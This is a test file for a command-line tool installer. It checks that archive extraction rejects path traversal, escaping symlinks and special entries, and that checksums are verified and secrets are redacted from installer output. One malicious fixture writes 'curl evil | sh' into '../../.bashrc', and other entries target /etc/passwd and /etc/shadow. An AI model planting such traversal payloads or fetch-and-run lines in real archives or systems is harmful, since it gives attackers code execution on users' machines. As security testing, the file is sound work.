import { expect, test } from "bun:test";
import { createHash } from "node:crypto";
import {
  chmod,
  lstat,
  mkdir,
  mkdtemp,
  readdir,
  readFile,
  realpath,
  rm,
  stat,
  symlink,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { deflateRawSync, gzipSync } from "node:zlib";
import {
  archiveEntryName,
  extractArchiveFile,
  UnsafeArchiveError,
} from "../src/tools/archive";
import {
  checksumOf,
  curatedTool,
  type InstallEnvironment,
  type InstallFetch,
  installTool,
} from "../src/tools/install";
import { looksSecret, safeTail } from "../src/tools/redact";
import { runTool, type ToolRunner } from "../src/tools/status";

const posix = process.platform !== "win32";

// A ustar archive built by hand, so a test can say exactly which entries,
// names, types and link targets it holds.
type TarEntry = {
  name: string;
  type?: "0" | "2" | "1" | "5" | "3";
  data?: string | Uint8Array;
  link?: string;
  pax?: Record<string, string>;
};
function tar(entries: readonly TarEntry[]): Uint8Array {
  const blocks: Uint8Array[] = [];
  const header = (name: string, size: number, type: string, link = "") => {
    const block = new Uint8Array(512);
    const put = (value: string, at: number, length: number) =>
      block.set(new TextEncoder().encode(value).subarray(0, length), at);
    put(name, 0, 100);
    put("0000755\0", 100, 8);
    put("0000000\0", 108, 8);
    put("0000000\0", 116, 8);
    put(`${size.toString(8).padStart(11, "0")}\0`, 124, 12);
    put("00000000000\0", 136, 12);
    put("        ", 148, 8);
    put(type, 156, 1);
    put(link, 157, 100);
    put("ustar\0", 257, 6);
    put("00", 263, 2);
    let sum = 0;
    for (const byte of block) sum += byte;
    put(`${sum.toString(8).padStart(6, "0")}\0 `, 148, 8);
    return block;
  };
  const padded = (data: Uint8Array) => {
    const out = new Uint8Array(Math.ceil(data.length / 512) * 512);
    out.set(data);
    return out;
  };
  for (const entry of entries) {
    if (entry.pax) {
      const body = Object.entries(entry.pax)
        .map(([key, value]) => {
          const record = ` ${key}=${value}\n`;
          let length = record.length + 1;
          while (`${length}${record}`.length !== length) length++;
          return `${length}${record}`;
        })
        .join("");
      const bytes = new TextEncoder().encode(body);
      blocks.push(header("PaxHeader", bytes.length, "x"), padded(bytes));
    }
    const data =
      typeof entry.data === "string"
        ? new TextEncoder().encode(entry.data)
        : (entry.data ?? new Uint8Array());
    blocks.push(
      header(entry.name, data.length, entry.type ?? "0", entry.link),
      padded(data),
    );
  }
  blocks.push(new Uint8Array(1024));
  const total = blocks.reduce((sum, block) => sum + block.length, 0);
  const out = new Uint8Array(total);
  let offset = 0;
  for (const block of blocks) {
    out.set(block, offset);
    offset += block.length;
  }
  return out;
}
const tarGz = (entries: readonly TarEntry[]) =>
  new Uint8Array(gzipSync(tar(entries)));

// A zip built by hand: deflated or stored entries, optionally a Unix
// symlink.
type ZipEntry = {
  name: string;
  data: string;
  symlink?: boolean;
  store?: boolean;
};
function zip(entries: readonly ZipEntry[]): Uint8Array {
  const parts: Uint8Array[] = [];
  const central: Uint8Array[] = [];
  let offset = 0;
  for (const entry of entries) {
    const name = new TextEncoder().encode(entry.name);
    const raw = new TextEncoder().encode(entry.data);
    const body = entry.store ? raw : new Uint8Array(deflateRawSync(raw));
    const local = new DataView(new ArrayBuffer(30));
    local.setUint32(0, 0x04034b50, true);
    local.setUint16(4, 20, true);
    local.setUint16(8, entry.store ? 0 : 8, true);
    local.setUint32(18, body.length, true);
    local.setUint32(22, raw.length, true);
    local.setUint16(26, name.length, true);
    const record = new DataView(new ArrayBuffer(46));
    record.setUint32(0, 0x02014b50, true);
    record.setUint16(4, (3 << 8) | 20, true);
    record.setUint16(10, entry.store ? 0 : 8, true);
    record.setUint32(20, body.length, true);
    record.setUint32(24, raw.length, true);
    record.setUint16(28, name.length, true);
    record.setUint32(
      38,
      ((entry.symlink ? 0o120777 : 0o100755) << 16) >>> 0,
      true,
    );
    record.setUint32(42, offset, true);
    parts.push(new Uint8Array(local.buffer), name, body);
    central.push(new Uint8Array(record.buffer), name);
    offset += 30 + name.length + body.length;
  }
  const directorySize = central.reduce((sum, part) => sum + part.length, 0);
  const end = new DataView(new ArrayBuffer(22));
  end.setUint32(0, 0x06054b50, true);
  end.setUint16(8, entries.length, true);
  end.setUint16(10, entries.length, true);
  end.setUint32(12, directorySize, true);
  end.setUint32(16, offset, true);
  const all = [...parts, ...central, new Uint8Array(end.buffer)];
  const out = new Uint8Array(all.reduce((sum, part) => sum + part.length, 0));
  let at = 0;
  for (const part of all) {
    out.set(part, at);
    at += part.length;
  }
  return out;
}

const sha = (bytes: Uint8Array) =>
  createHash("sha256").update(bytes).digest("hex");

// A fake binary: a shell script answering --version.
const binary = (name: string, version: string) =>
  `#!/bin/sh\nif [ "$1" = "--version" ]; then echo "${name} version ${version}"; exit 0; fi\nexit 1\n`;

test("an archive is refused for absolute names, parent segments, escaping links and special entries", () => {
  const good = binary("wacli", "0.19.0");
  expect(
    new TextDecoder().decode(
      extractArchiveFile(
        tarGz([
          { name: "LICENSE", data: "MIT" },
          { name: "wacli", data: good },
          { name: "docs/readme", type: "2", link: "../LICENSE" },
        ]),
        "tar.gz",
        "wacli",
      ),
    ),
  ).toBe(good);
  const refused: TarEntry[][] = [
    [
      { name: "/etc/passwd", data: "x" },
      { name: "wacli", data: good },
    ],
    [
      { name: "../escape", data: "x" },
      { name: "wacli", data: good },
    ],
    [
      { name: "a/../../escape", data: "x" },
      { name: "wacli", data: good },
    ],
    [
      { name: "wacli", data: good },
      { name: "link", type: "2", link: "/etc/shadow" },
    ],
    [
      { name: "wacli", data: good },
      { name: "a/link", type: "2", link: "../../x" },
    ],
    [
      { name: "wacli", data: good },
      { name: "dev", type: "3" },
    ],
    [
      { name: "x", data: "x", pax: { path: "../../pax-escape" } },
      { name: "wacli", data: good },
    ],
    [
      { name: "wacli", type: "2", link: "LICENSE" },
      { name: "LICENSE", data: "x" },
    ],
    [
      { name: "wacli", data: good },
      { name: "./wacli", data: good },
    ],
    [{ name: "LICENSE", data: "x" }],
  ];
  for (const entries of refused)
    expect(() => extractArchiveFile(tarGz(entries), "tar.gz", "wacli")).toThrow(
      UnsafeArchiveError,
    );
  // The same rules for zip.
  const base = "gh_2.101.0_macOS_arm64";
  const ghBinary = binary("gh", "2.101.0");
  expect(
    new TextDecoder().decode(
      extractArchiveFile(
        zip([
          { name: `${base}/LICENSE`, data: "MIT", store: true },
          { name: `${base}/bin/gh`, data: ghBinary },
        ]),
        "zip",
        `${base}/bin/gh`,
      ),
    ),
  ).toBe(ghBinary);
  for (const entries of [
    [{ name: "/abs", data: "x" }],
    [{ name: `${base}/../../x`, data: "x" }],
    [{ name: `${base}/l`, data: "/etc/passwd", symlink: true }],
    [{ name: `${base}/bin/gh`, data: "../../../x", symlink: true }],
  ] satisfies ZipEntry[][])
    expect(() =>
      extractArchiveFile(
        zip([...entries, { name: `${base}/bin/gh`, data: ghBinary }]),
        "zip",
        `${base}/bin/gh`,
      ),
    ).toThrow(UnsafeArchiveError);
  // A zip that declares more than the limit is refused before anything is
  // inflated, by one entry or by the sum of all.
  const declared = (sizes: readonly number[]) => {
    const archive = zip([
      ...sizes.map((_, index) => ({ name: `${base}/pad${index}`, data: "x" })),
      { name: `${base}/bin/gh`, data: ghBinary },
    ]);
    const view = new DataView(
      archive.buffer,
      archive.byteOffset,
      archive.byteLength,
    );
    let entry = 0;
    for (let at = 0; at + 4 <= archive.length; at += 1)
      if (view.getUint32(at, true) === 0x02014b50 && entry < sizes.length) {
        view.setUint32(at + 24, sizes[entry] as number, true);
        entry += 1;
      }
    return archive;
  };
  for (const sizes of [
    [600 * 1024 * 1024],
    [300 * 1024 * 1024, 300 * 1024 * 1024],
  ])
    expect(() =>
      extractArchiveFile(declared(sizes), "zip", `${base}/bin/gh`),
    ).toThrow("Archive expands beyond the limit");
  expect(archiveEntryName("./a//b/")).toBe("a/b");
  expect(() => archiveEntryName("a\\b")).toThrow(UnsafeArchiveError);
});

test("a checksum is the one line for exactly that asset", () => {
  const digest = "a".repeat(64);
  const file = `${"b".repeat(64)}  gh_2.101.0_linux_amd64.tar.gz.sig\n${digest}  gh_2.101.0_linux_amd64.tar.gz\n`;
  expect(checksumOf(file, "gh_2.101.0_linux_amd64.tar.gz")).toBe(digest);
  expect(checksumOf(file, "gh_2.101.0_linux_arm64.tar.gz")).toBeUndefined();
  expect(
    checksumOf(
      `${file}${"c".repeat(64)}  gh_2.101.0_linux_amd64.tar.gz\n`,
      "gh_2.101.0_linux_amd64.tar.gz",
    ),
  ).toBeUndefined();
});

test("an installer's output tail is bounded and withholds anything token-like", () => {
  const tail = safeTail(
    [
      ...Array.from({ length: 30 }, (_, index) => `line ${index}`),
      "\u001b[31mdownloading bundle\u001b[0m",
      `token: ${["ghp", "0123456789abcdefghijABCDEFGHIJ012345"].join("_")}`,
      "open https://dashboard.composio.dev/?cliKey=abcdef",
      "code WXYZ-9876",
      "done",
    ].join("\n"),
  );
  expect(tail.split("\n")).toHaveLength(12);
  expect(tail).toContain("downloading bundle");
  expect(tail).not.toContain("\u001b");
  expect(tail).not.toContain("ghp_");
  expect(tail).not.toContain("cliKey");
  expect(tail).not.toContain("WXYZ-9876");
  expect(tail).toContain("[line withheld]");
  expect(looksSecret("installed composio 0.3.1 to ~/.composio")).toBe(false);
});

test("only the launchpad-setup tools have a curated installer", () => {
  expect(curatedTool("gh")?.name).toBe("gh");
  expect(curatedTool("composio")?.name).toBe("composio");
  expect(curatedTool("wacli")?.name).toBe("wacli");
  for (const name of ["gogcli", "neon", "codex", "git", "unknown"])
    expect(curatedTool(name)).toBeUndefined();
});

// A fake official source: the release API, the checksums file and the
// asset of one release, and the composio installer script. Every request is
// recorded; anything else is a 404.
function fakeSource(files: Record<string, Uint8Array | string>) {
  const requests: string[] = [];
  const fetcher: InstallFetch = async (url) => {
    requests.push(url);
    const body = files[url];
    if (body === undefined) return new Response("not found", { status: 404 });
    return new Response(body as BodyInit);
  };
  return { fetcher, requests };
}

async function sandbox() {
  const home = await realpath(
    await mkdtemp(join(tmpdir(), "lazurio-install-")),
  );
  const bin = join(home, ".local", "bin");
  const system = join(home, "system");
  await mkdir(system, { recursive: true });
  // The PATH of the sandbox holds no system directory: a runner may have its
  // own gh in /usr/bin. The few utilities the fake installers need are linked
  // into a private directory.
  const utilities = join(home, "utilities");
  await mkdir(utilities, { recursive: true });
  for (const name of ["mkdir", "chmod", "ln", "env", "cat", "rm", "sleep"]) {
    const found = Bun.which(name);
    if (found) await symlink(found, join(utilities, name));
  }
  const environment = (
    fetcher: InstallFetch,
    overrides: Partial<InstallEnvironment> = {},
  ): InstallEnvironment => ({
    path: [bin, system, utilities].join(":"),
    home,
    platform: "linux",
    arch: "x64",
    run: runTool,
    fetch: fetcher,
    temporaryDirectory: home,
    ...overrides,
  });
  return {
    home,
    bin,
    system,
    environment,
    async close() {
      await rm(home, { recursive: true, force: true });
    },
  };
}

const ghRelease = (
  version: string,
  archive: Uint8Array,
  digest = sha(archive),
) => ({
  "https://api.github.com/repos/cli/cli/releases/latest": JSON.stringify({
    tag_name: `v${version}`,
  }),
  [`https://github.com/cli/cli/releases/download/v${version}/gh_${version}_checksums.txt`]: `${digest}  gh_${version}_linux_amd64.tar.gz\n${"0".repeat(64)}  gh_${version}_linux_arm64.tar.gz\n`,
  [`https://github.com/cli/cli/releases/download/v${version}/gh_${version}_linux_amd64.tar.gz`]:
    archive,
});

test.skipIf(!posix)(
  "gh: the latest release, verified against its checksums, placed atomically as ~/.local/bin/gh",
  async () => {
    const box = await sandbox();
    try {
      const archive = tarGz([
        { name: "gh_2.101.0_linux_amd64/LICENSE", data: "MIT" },
        {
          name: "gh_2.101.0_linux_amd64/bin/gh",
          data: binary("gh", "2.101.0"),
        },
        { name: "gh_2.101.0_linux_amd64/share/man/man1/gh.1", data: "man" },
      ]);
      const source = fakeSource(ghRelease("2.101.0", archive));
      const result = await installTool("gh", box.environment(source.fetcher));
      expect(result).toEqual({
        kind: "installed",
        tool: "gh",
        version: "2.101.0",
        path: join(box.bin, "gh"),
        onPath: true,
      });
      const placed = await stat(join(box.bin, "gh"));
      expect(placed.mode & 0o777).toBe(0o755);
      // Only the binary; no temporary directory, man page or license left.
      expect(await readdir(box.bin)).toEqual(["gh"]);
      expect(source.requests).toEqual([
        "https://api.github.com/repos/cli/cli/releases/latest",
        "https://github.com/cli/cli/releases/download/v2.101.0/gh_2.101.0_checksums.txt",
        "https://github.com/cli/cli/releases/download/v2.101.0/gh_2.101.0_linux_amd64.tar.gz",
      ]);
      // Working now: a second run changes nothing and downloads nothing.
      const again = fakeSource({});
      expect(await installTool("gh", box.environment(again.fetcher))).toEqual({
        kind: "already-installed",
        tool: "gh",
        version: "2.101.0",
        path: join(box.bin, "gh"),
      });
      expect(again.requests).toEqual([]);
    } finally {
      await box.close();
    }
  },
);

test.skipIf(!posix)(
  "a checksum mismatch, a missing checksum or an unsafe archive places nothing",
  async () => {
    const box = await sandbox();
    try {
      const archive = tarGz([
        {
          name: "gh_2.101.0_linux_amd64/bin/gh",
          data: binary("gh", "2.101.0"),
        },
      ]);
      const mismatch = fakeSource(
        ghRelease("2.101.0", archive, "f".repeat(64)),
      );
      expect(
        await installTool("gh", box.environment(mismatch.fetcher)),
      ).toEqual({
        kind: "install-failed",
        tool: "gh",
        stage: "checksum",
        reason: "checksum-mismatch",
        fallback: "agent",
      });
      const missing = ghRelease("2.101.0", archive);
      missing[
        "https://github.com/cli/cli/releases/download/v2.101.0/gh_2.101.0_checksums.txt"
      ] = `${"0".repeat(64)}  gh_2.101.0_linux_arm64.tar.gz\n`;
      expect(
        (await installTool("gh", box.environment(fakeSource(missing).fetcher)))
          .kind,
      ).toBe("install-failed");
      const malicious = tarGz([
        {
          name: "gh_2.101.0_linux_amd64/bin/gh",
          data: binary("gh", "2.101.0"),
        },
        { name: "../../.bashrc", data: "curl evil | sh" },
      ]);
      expect(
        await installTool(
          "gh",
          box.environment(fakeSource(ghRelease("2.101.0", malicious)).fetcher),
        ),
      ).toMatchObject({
        kind: "install-failed",
        stage: "extract",
        reason: "archive-unsafe",
        fallback: "agent",
      });
      const linked = tarGz([
        { name: "gh_2.101.0_linux_amd64/bin/gh", type: "2", link: "/bin/sh" },
      ]);
      expect(
        await installTool(
          "gh",
          box.environment(fakeSource(ghRelease("2.101.0", linked)).fetcher),
        ),
      ).toMatchObject({ kind: "install-failed", stage: "extract" });
      // An unreachable or non-https source.
      expect(
        await installTool("gh", box.environment(fakeSource({}).fetcher)),
      ).toMatchObject({
        kind: "install-failed",
        stage: "resolve",
        reason: "http-404",
      });
      const plain: InstallFetch = async () => {
        const response = new Response("{}");
        Object.defineProperty(response, "url", {
          value: "http://github.com/x",
        });
        return response;
      };
      expect(await installTool("gh", box.environment(plain))).toMatchObject({
        kind: "install-failed",
        stage: "resolve",
        reason: "not-https",
      });
      // Nothing was placed by any of them, not even a temporary directory.
      const placed = await readdir(box.bin).catch(() => []);
      expect(placed).toEqual([]);
    } finally {
      await box.close();
    }
  },
);

test.skipIf(!posix)(
  "a working tool anywhere on PATH is never touched; a broken one elsewhere is not shadowed",
  async () => {
    const box = await sandbox();
    try {
      const source = fakeSource({});
      await writeFile(join(box.system, "gh"), binary("gh", "2.40.0"));
      await chmod(join(box.system, "gh"), 0o755);
      expect(await installTool("gh", box.environment(source.fetcher))).toEqual({
        kind: "already-installed",
        tool: "gh",
        version: "2.40.0",
        path: join(box.system, "gh"),
      });
      // Broken elsewhere: refused before any download, with the agent path.
      await writeFile(join(box.system, "gh"), "#!/bin/sh\nexit 3\n");
      expect(await installTool("gh", box.environment(source.fetcher))).toEqual({
        kind: "install-failed",
        tool: "gh",
        stage: "preflight",
        reason: "broken-installation-elsewhere",
        fallback: "agent",
      });
      expect(source.requests).toEqual([]);
      // A dangling ~/.local/bin/gh link is the standard path and is repaired.
      await rm(join(box.system, "gh"));
      await mkdir(box.bin, { recursive: true });
      await symlink(join(box.home, "gone", "gh"), join(box.bin, "gh"));
      const archive = tarGz([
        {
          name: "gh_2.101.0_linux_amd64/bin/gh",
          data: binary("gh", "2.101.0"),
        },
      ]);
      expect(
        await installTool(
          "gh",
          box.environment(fakeSource(ghRelease("2.101.0", archive)).fetcher),
        ),
      ).toMatchObject({ kind: "installed", version: "2.101.0" });
      expect((await lstat(join(box.bin, "gh"))).isFile()).toBe(true);
    } finally {
      await box.close();
    }
  },
);

test.skipIf(!posix)(
  "an unsupported platform is refused with the agent fallback; wacli and macOS asset names",
  async () => {
    const box = await sandbox();
    try {
      const source = fakeSource({});
      for (const [platform, arch] of [
        ["win32", "x64"],
        ["linux", "ia32"],
        ["freebsd", "x64"],
      ] as const)
        expect(
          await installTool(
            "wacli",
            box.environment(source.fetcher, { platform, arch }),
          ),
        ).toEqual({
          kind: "unsupported-platform",
          tool: "wacli",
          platform,
          arch,
          fallback: "agent",
        });
      expect(source.requests).toEqual([]);
      const archive = tarGz([
        { name: "LICENSE", data: "MIT" },
        { name: "README.md", data: "wacli" },
        { name: "wacli", data: binary("wacli", "0.19.0") },
      ]);
      const release =
        "https://github.com/openclaw/wacli/releases/download/v0.19.0";
      const wacli = fakeSource({
        "https://api.github.com/repos/openclaw/wacli/releases/latest":
          JSON.stringify({ tag_name: "v0.19.0" }),
        [`${release}/checksums.txt`]: `${sha(archive)}  wacli_0.19.0_darwin_arm64.tar.gz\n`,
        [`${release}/wacli_0.19.0_darwin_arm64.tar.gz`]: archive,
      });
      expect(
        await installTool(
          "wacli",
          box.environment(wacli.fetcher, { platform: "darwin", arch: "arm64" }),
        ),
      ).toMatchObject({ kind: "installed", tool: "wacli", version: "0.19.0" });
      // gh on macOS is a zip with the binary under bin/.
      const base = "gh_2.101.0_macOS_arm64";
      const ghZip = zip([
        { name: `${base}/LICENSE`, data: "MIT" },
        { name: `${base}/bin/gh`, data: binary("gh", "2.101.0") },
      ]);
      const ghRoot = "https://github.com/cli/cli/releases/download/v2.101.0";
      expect(
        await installTool(
          "gh",
          box.environment(
            fakeSource({
              "https://api.github.com/repos/cli/cli/releases/latest":
                JSON.stringify({ tag_name: "v2.101.0" }),
              [`${ghRoot}/gh_2.101.0_checksums.txt`]: `${sha(ghZip)}  ${base}.zip\n`,
              [`${ghRoot}/${base}.zip`]: ghZip,
            }).fetcher,
            { platform: "darwin", arch: "arm64" },
          ),
        ),
      ).toMatchObject({ kind: "installed", tool: "gh", version: "2.101.0" });
    } finally {
      await box.close();
    }
  },
);

test.skipIf(!posix)(
  "composio: the official installer is downloaded first and run with the controlled environment",
  async () => {
    const box = await sandbox();
    try {
      const seen: {
        command: readonly string[];
        env: Record<string, string>;
      }[] = [];
      const run: ToolRunner = async (command, timeout, env) => {
        seen.push({ command: [...command], env: { ...env } });
        return runTool(command, timeout, env);
      };
      // The fake installer does what the real one does: the bundle in
      // ~/.composio and a link in ~/.local/bin.
      const script = `#!/bin/sh
set -eu
mkdir -p "$HOME/.composio" "$HOME/.local/bin"
printf '#!/bin/sh\\necho 0.3.1\\n' > "$HOME/.composio/composio"
chmod 755 "$HOME/.composio/composio"
ln -sf "$HOME/.composio/composio" "$HOME/.local/bin/composio"
env > "$HOME/installer.env"
echo "Installed composio"
`;
      const source = fakeSource({ "https://composio.dev/install": script });
      expect(
        await installTool("composio", box.environment(source.fetcher, { run })),
      ).toEqual({
        kind: "installed",
        tool: "composio",
        version: "0.3.1",
        path: join(box.bin, "composio"),
        onPath: true,
      });
      const installer = seen.find((call) => call.command[0] === "/bin/sh");
      expect(installer?.command[1]).toMatch(
        /lazurio-install-[^/]+\/install\.sh$/,
      );
      expect(installer?.env).toEqual({
        PATH: box.environment(source.fetcher).path as string,
        HOME: box.home,
        COMPOSIO_INSTALL_PLUGINS: "0",
        COMPOSIO_INSTALL_SHELL: "none",
        COMPOSIO_INSTALL_HELP: "0",
      });
      // The private script is gone.
      expect(
        (await readdir(box.home)).filter((name) =>
          name.startsWith("lazurio-install-"),
        ),
      ).toEqual([]);
      const env = await readFile(join(box.home, "installer.env"), "utf8");
      expect(env).not.toContain("COMPOSIO_INSTALL_VERSION");
    } finally {
      await box.close();
    }
  },
);

test.skipIf(!posix)(
  "composio: a failed download runs nothing; a failing installer reports a safe tail",
  async () => {
    const box = await sandbox();
    try {
      const seen: string[][] = [];
      const run: ToolRunner = async (command, timeout, env) => {
        seen.push([...command]);
        return runTool(command, timeout, env);
      };
      expect(
        await installTool(
          "composio",
          box.environment(fakeSource({}).fetcher, { run }),
        ),
      ).toEqual({
        kind: "install-failed",
        tool: "composio",
        stage: "download",
        reason: "http-404",
        fallback: "agent",
      });
      expect(seen.filter((command) => command[0] === "/bin/sh")).toEqual([]);
      const failing = fakeSource({
        "https://composio.dev/install":
          "#!/bin/sh\necho 'resolving release'\necho 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz0123456789' >&2\necho 'unsupported libc' >&2\nexit 4\n",
      });
      const result = await installTool(
        "composio",
        box.environment(failing.fetcher, { run }),
      );
      expect(result).toMatchObject({
        kind: "install-failed",
        stage: "installer",
        reason: "exit-4",
        fallback: "agent",
      });
      if (result.kind !== "install-failed") throw new Error("not failed");
      expect(result.detail).toContain("unsupported libc");
      expect(result.detail).not.toContain("abcdefghijklmnopqrstuvwxyz");
      // An installer that succeeds and leaves a tool that does not run: the
      // entry in the standard path is not left behind.
      const broken = fakeSource({
        "https://composio.dev/install":
          '#!/bin/sh\nset -eu\nmkdir -p "$HOME/.composio" "$HOME/.local/bin"\nprintf \'#!/bin/sh\\nexit 7\\n\' > "$HOME/.composio/composio"\nchmod 755 "$HOME/.composio/composio"\nln -sf "$HOME/.composio/composio" "$HOME/.local/bin/composio"\n',
      });
      expect(
        await installTool("composio", box.environment(broken.fetcher, { run })),
      ).toEqual({
        kind: "install-failed",
        tool: "composio",
        stage: "verify",
        reason: "version-failed",
        fallback: "agent",
      });
      expect(await readdir(box.bin)).toEqual([]);
      // An installer that succeeds and places nothing: a broken entry that
      // was there before the attempt stays the operator's.
      await writeFile(join(box.bin, "composio"), "#!/bin/sh\nexit 9\n", {
        mode: 0o755,
      });
      const idle = fakeSource({
        "https://composio.dev/install": "#!/bin/sh\necho done\n",
      });
      expect(
        await installTool("composio", box.environment(idle.fetcher, { run })),
      ).toMatchObject({ kind: "install-failed", stage: "verify" });
      expect(await readFile(join(box.bin, "composio"), "utf8")).toBe(
        "#!/bin/sh\nexit 9\n",
      );
    } finally {
      await box.close();
    }
  },
);
